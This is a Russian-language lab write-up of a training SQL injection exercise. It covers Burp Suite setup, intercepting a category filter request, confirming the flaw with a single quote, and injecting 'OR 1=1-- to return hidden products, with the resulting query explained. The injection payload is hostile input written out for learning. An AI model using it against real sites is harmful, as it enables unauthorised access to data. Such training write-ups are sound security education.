# Lab1 - SQL-Injection
## Цель: SQL injection vulnerability in WHERE clause allowing retrieval 
of hidden data

### Настройка окружения
1. Burp Suite Community Edition
2. Proxy → Open Browser (встроенный Chromium с уже настроенным прокси)
3. Открываю Lab через встроеный браузер (Важно открыть через него, иначе трафик не пойдет через Burp)

## Процесс

### Шаг 1 - перехват трафика
1. Proxy → HTTP history вместо Intercept для обычного просмотра (Intercept держит запрос на паузе и мешает странице грузиться — использовать только для точечного перехвата в моменте)
2. Покликал по категориям товаров в Lab , и нашел в истории запросов: GET /filter?category=Food+%26+Drink HTTP/2

### Шаг 2 - Send to Repeater
1. Нажал ПКМ по запросу -> Send to Repeater (теперь можно менять параметры и видить ответ сервера)

### Шаг 3 - Уязвимость
1. Добавил в конец параметра одну ковычку -> GET /filter?category=Food+%26+Drink' HTTP/2
2. Ответ сервера - SQL-ошибка в теле ответа.

### Шаг 4 - Эксплуатация
1. Добавил к параметру -> GET /filter?category=Food+%26+Drink'OR 1=1--  HTTP/2 ( Пробел после "--" обязателен)
Что произошло на сервере:
-- Было: SELECT * FROM products WHERE category = 'Food & Drink' AND released = 1
-- Стало: SELECT * FROM products WHERE category = 'Food & Drink' OR 1=1-- ' AND released = 1
OR 1=1 - всегда истина , и поэтому вернулись все товары включая скрытые

Размер ответа вырос с 86 строк кода до 282 - подверждает что вернулось подольше данных чем должно
